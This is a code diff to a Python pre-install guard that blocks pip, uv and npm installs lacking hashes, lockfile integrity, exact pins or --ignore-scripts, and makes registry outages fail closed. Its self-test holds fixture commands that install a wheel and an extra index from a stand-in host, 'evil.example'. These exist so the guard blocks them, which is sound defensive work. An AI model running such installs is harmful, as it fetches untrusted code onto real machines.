@@ -24,8 +24,11 @@ Self-test: ``python dependency-provenance-guard.py --self-test``.
 from __future__ import annotations
 
 import json
+import os
 import re
 import sys
+import tempfile
+import time
 import urllib.error
 import urllib.parse
 import urllib.request
@@ -45,6 +48,8 @@ from safety_common import (  # noqa: E402
 
 MIN_RELEASE_AGE_DAYS = 7
 NET_TIMEOUT = 4
+VERIFIED_CACHE_TTL = 24 * 3600
+VERIFIED_CACHE = Path.home() / ".claude" / "state" / "dependency-provenance-cache.json"
 
 OFFICIAL_HOSTS = {
     "pypi": {"pypi.org"},
@@ -55,6 +60,7 @@ OFFICIAL_HOSTS = {
 
 INSTALL_PATTERNS = (
     ("pip", re.compile(r"(?i)(?:^|[;&|])\s*(?:python(?:\.exe)?|py(?:\.exe)?)?\s*(?:-m\s+)?pip\s+(install|download)\b")),
+    ("uv-pip", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+pip\s+(install|sync|download)\b")),
     ("uv-add", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+add\b")),
     ("uv-sync", re.compile(r"(?i)(?:^|[;&|])\s*uv\s+sync\b")),
     ("npm", re.compile(r"(?i)(?:^|[;&|])\s*(npm|pnpm|yarn|bun)\s+(install|i|add|ci)\b")),
@@ -108,6 +114,7 @@ def registry_record(name: str, ecosystem: str, version: str) -> dict | None:
             "exists": True,
             "version": True,
             "latest": (data.get("info") or {}).get("version"),
+            "source": f"https://pypi.org/pypi/{quoted}/json",
             "released": min(timestamps) if timestamps else None,
             "digest": bool(digests),
             "digests": digests,
@@ -123,6 +130,7 @@ def registry_record(name: str, ecosystem: str, version: str) -> dict | None:
         "version": bool(version_data),
         "latest": ((data.get("dist-tags") or {}).get("latest")
                    if data is not False else None),
+        "source": f"https://registry.npmjs.org/{quoted}",
         "released": (data.get("time") or {}).get(version) if data is not False else None,
         "digest": bool(dist.get("integrity") or dist.get("shasum")),
         "integrity": dist.get("integrity"),
@@ -146,6 +154,94 @@ def detect_install(command: str) -> tuple[str, re.Match[str]] | None:
         if match:
             return kind, match
     return None
+
+
+def load_verified_cache() -> dict:
+    try:
+        data = json.loads(VERIFIED_CACHE.read_text(encoding="utf-8"))
+    except (OSError, json.JSONDecodeError):
+        return {}
+    now = time.time()
+    return {
+        key: value for key, value in data.items()
+        if isinstance(value, dict)
+        and now - float(value.get("verified_at", 0)) < VERIFIED_CACHE_TTL
+        and value.get("source")
+        and value.get("digest")
+        and value.get("version")
+    }
+
+
+def save_verified_cache(cache: dict) -> None:
+    try:
+        VERIFIED_CACHE.parent.mkdir(parents=True, exist_ok=True)
+        tmp = VERIFIED_CACHE.with_suffix(".tmp")
+        tmp.write_text(json.dumps(cache, ensure_ascii=False), encoding="utf-8")
+        os.replace(tmp, VERIFIED_CACHE)
+    except OSError:
+        pass
+
+
+def lookup_with_verified_fallback(name: str, ecosystem: str, version: str) -> dict | None:
+    """Use live registry evidence, then only a recent previously verified record."""
+    live = registry_record(name, ecosystem, version)
+    if live is not None:
+        if live.get("exists") and live.get("version") and live.get("digest"):
+            cache = load_verified_cache()
+            cache[f"{ecosystem}:{name.lower()}@{version}"] = {
+                **live, "verified_at": time.time(), "cached": False
+            }
+            save_verified_cache(cache)
+        return live
+    cached = load_verified_cache().get(f"{ecosystem}:{name.lower()}@{version}")
+    if cached:
+        return {**cached, "cached": True}
+    return None
+
+
+def project_root_from_event(event: dict) -> Path:
+    value = event.get("cwd") or (event.get("tool_input") or {}).get("cwd")
+    return Path(str(value)).expanduser() if value else Path.cwd()
+
+
+def lock_has_integrity(root: Path, ecosystem: str) -> bool:
+    if ecosystem == "npm":
+        for filename in ("package-lock.json", "npm-shrinkwrap.json"):
+            path = root / filename
+            try:
+                data = json.loads(path.read_text(encoding="utf-8"))
+            except (OSError, json.JSONDecodeError):
+                continue
+            entries = list((data.get("packages") or {}).values())
+            entries.extend((data.get("dependencies") or {}).values())
+            if any(isinstance(item, dict) and item.get("integrity") for item in entries):
+                return True
+        return False
+    if ecosystem == "pip":
+        return False
+    if ecosystem == "uv":
+        try:
+            return bool(re.search(r"sha256[-:][0-9a-f]{32,}",
+                                  (root / "uv.lock").read_text(encoding="utf-8"),
+                                  re.IGNORECASE))
+        except OSError:
+            return False
+    return False
+
+
+def pip_hashes_present(command: str, root: Path) -> bool:
+    if re.search(r"(?i)--hash(?:=|\s+)sha256:[0-9a-f]{32,}", command):
+        return True
+    requirements = re.findall(r"(?i)(?:^|\s)-r\s+([^\s;&|]+)", command)
+    for item in requirements:
+        path = (root / item.strip("\"'")) if not Path(item).is_absolute() else Path(item)
+        try:
+            if re.search(r"(?i)--hash(?:=|\s+)sha256:[0-9a-f]{32,}",
+                         path.read_text(encoding="utf-8")):
+                return True
+        except OSError:
+            continue
+    return False
 
 
 def option_value(command: str, option: str) -> list[str]:
@@ -203,24 +299,32 @@ def exact_specs(command: str, ecosystem: str) -> list[tuple[str, str]]:
 def inspect_command(
     command: str,
     lookup: Callable[[str, str, str], dict | None] = registry_record,
+    project_root: Path | None = None,
 ) -> tuple[list[str], list[str]]:
     """Return (blocking findings, advisory notes) without reading stdin."""
     detected = detect_install(command)
     if not detected:
         return [], []
     kind, match = detected
-    ecosystem = "npm" if kind == "npm" else "pip" if kind in {"pip", "uv-add", "uv-sync"} else kind
+    ecosystem = "npm" if kind == "npm" else "pip" if kind in {"pip", "uv-pip", "uv-add", "uv-sync"} else kind
+    root = project_root or Path.cwd()
     blocking = source_findings(command, ecosystem)
     notes: list[str] = []
 
-    if kind == "pip" and "--require-hashes" not in command:
+    if kind in {"pip", "uv-pip"} and "--require-hashes" not in command:
         blocking.append("pip download/install must use --require-hashes so wheel digests are checked")
+    if kind in {"pip", "uv-pip"} and "--require-hashes" in command and not pip_hashes_present(command, root):
+        blocking.append("pip --require-hashes is incomplete without a sha256 hash in the requirement")
     if kind == "uv-sync" and "--locked" not in command:
         blocking.append("uv sync must use --locked so resolution cannot silently replace the reviewed lock")
+    if kind == "uv-sync" and "--locked" in command and not lock_has_integrity(root, "uv"):
+        blocking.append("uv sync --locked requires uv.lock with artifact hashes")
     if kind == "npm":
         subcommand = match.group(2).lower()
         if "--ignore-scripts" not in command:
             blocking.append("npm dependency installation must use --ignore-scripts to stop package install hooks")
+        elif subcommand == "ci" and not lock_has_integrity(root, "npm"):
+            blocking.append("npm ci --ignore-scripts requires package-lock.json integrity entries")
         elif subcommand != "ci" and not exact_specs(command, "npm"):
             blocking.append("npm install/add must name an exact package version; use package@version or npm ci")
 
@@ -228,7 +332,10 @@ def inspect_command(
     for name, version in specs:
         record = lookup(name, ecosystem, version)
         if record is None:
-            notes.append(f"registry lookup unavailable for {name}@{version}; no authenticity claim was made")
+            blocking.append(
+                f"{name}@{version}: canonical registry unavailable and no recent verified evidence exists. "
+                "Install blocked; search a verified alternative or restore registry access."
+            )
             continue
         if not record.get("exists"):
             blocking.append(f"{name}: package does not exist in the canonical {ecosystem} registry")
@@ -262,10 +369,17 @@ def main() -> None:
         allow()
 
     try:
-        blocking, notes = inspect_command(command)
-    except Exception as exc:  # a verifier bug must not wedge unrelated work
-        notes = [f"provenance verifier failed closed only for its own output: {type(exc).__name__}"]
-        blocking = []
+        blocking, notes = inspect_command(
+            command,
+            lookup=lookup_with_verified_fallback,
+            project_root=project_root_from_event(event),
+        )
+    except Exception as exc:
+        blocking = [
+            "provenance verifier failed; install blocked until the verifier is repaired",
+            f"verifier error: {type(exc).__name__}",
+        ]
+        notes = []
     if blocking:
         log("BLOCK", "dependency_provenance", "deny", blocking[0], command)
         block(
@@ -294,34 +408,45 @@ def _self_test() -> int:
     def lookup(name: str, ecosystem: str, version: str) -> dict | None:
         return records.get((name, ecosystem, version), {"exists": False, "version": False, "digest": False})
 
-    cases = [
-        ("direct wheel", "pip install https://evil.example/payload.whl --require-hashes", True),
-        ("bare pip", "pip install demo==1.2.3", True),
-        ("hashed pip exact", "pip install demo==1.2.3 --require-hashes", False),
-        ("official pip index", "pip install --index-url https://pypi.org/simple demo==1.2.3 --require-hashes", False),
-        ("missing exact version", "pip install demo==9.9.9 --require-hashes", True),
-        ("extra index", "pip install demo==1.2.3 --require-hashes --extra-index-url https://evil.example/simple", True),
-        ("locked uv", "uv sync --locked", False),
-        ("unlocked uv", "uv sync", True),
-        ("uv add exact", "uv add demo==1.2.3", False),
-        ("uv add missing version", "uv add demo==9.9.9", True),
-        ("npm ci", "npm ci --ignore-scripts", False),
-        ("npm ci with scripts", "npm ci", True),
-        ("npm direct unpinned", "npm install --ignore-scripts demo", True),
-        ("npm exact", "npm install --ignore-scripts demo@1.2.3", False),
-        ("official npm registry", "npm install --registry https://registry.npmjs.org/ --ignore-scripts demo@1.2.3", False),
-        ("fresh npm release", "npm install --ignore-scripts demo@0.0.1", True),
-        ("non-install command", "python -c \"print('pip install demo')\"", False),
-    ]
     failures: list[str] = []
-    for label, command, should_block in cases:
-        blocking, _ = inspect_command(command, lookup)
-        got = bool(blocking)
-        if got != should_block:
-            failures.append(f"{label}: got block={got}, expected {should_block}; {blocking}")
-    _, latest_notes = inspect_command("pip install demo==1.2.3 --require-hashes", lookup)
-    if not any("prefer latest" in note for note in latest_notes):
-        failures.append("an older exact pin did not report the latest stable release")
+    with tempfile.TemporaryDirectory() as temp_dir:
+        root = Path(temp_dir)
+        (root / "uv.lock").write_text("resolution: sha256:abc1234567890123456789012345678901234567890123456789012345678901\n", encoding="utf-8")
+        (root / "package-lock.json").write_text(json.dumps({"packages": {"node_modules/demo": {"integrity": "sha512-demo"}}}), encoding="utf-8")
+        cases = [
+            ("direct wheel", "pip install https://evil.example/payload.whl --require-hashes", True),
+            ("bare pip", "pip install demo==1.2.3", True),
+            ("hashed pip exact", "pip install demo==1.2.3 --require-hashes --hash=sha256:abc1234567890123456789012345678901234567890123456789012345678901", False),
+            ("official pip index", "pip install --index-url https://pypi.org/simple demo==1.2.3 --require-hashes --hash=sha256:abc1234567890123456789012345678901234567890123456789012345678901", False),
+            ("missing exact version", "pip install demo==9.9.9 --require-hashes", True),
+            ("extra index", "pip install demo==1.2.3 --require-hashes --extra-index-url https://evil.example/simple", True),
+            ("locked uv", "uv sync --locked", False),
+            ("unlocked uv", "uv sync", True),
+            ("uv add exact", "uv add demo==1.2.3", False),
+            ("uv add missing version", "uv add demo==9.9.9", True),
+            ("npm ci", "npm ci --ignore-scripts", False),
+            ("npm ci with scripts", "npm ci", True),
+            ("npm direct unpinned", "npm install --ignore-scripts demo", True),
+            ("npm exact", "npm install --ignore-scripts demo@1.2.3", False),
+            ("official npm registry", "npm install --registry https://registry.npmjs.org/ --ignore-scripts demo@1.2.3", False),
+            ("fresh npm release", "npm install --ignore-scripts demo@0.0.1", True),
+            ("non-install command", "python -c \"print('pip install demo')\"", False),
+        ]
+        for label, command, should_block in cases:
+            blocking, _ = inspect_command(command, lookup, project_root=root)
+            got = bool(blocking)
+            if got != should_block:
+                failures.append(f"{label}: got block={got}, expected {should_block}; {blocking}")
+        _, latest_notes = inspect_command("pip install demo==1.2.3 --require-hashes", lookup, project_root=root)
+        if not any("prefer latest" in note for note in latest_notes):
+            failures.append("an older exact pin did not report the latest stable release")
+        offline, _ = inspect_command(
+            "npm install --ignore-scripts demo@1.2.3",
+            lambda _name, _ecosystem, _version: None,
+            project_root=root,
+        )
+        if not any("registry unavailable" in item for item in offline):
+            failures.append("registry outage did not block an unverified install")
     print("SELF-TEST: PASS" if not failures else "SELF-TEST: FAIL")
     for failure in failures:
         print("  -", failure)
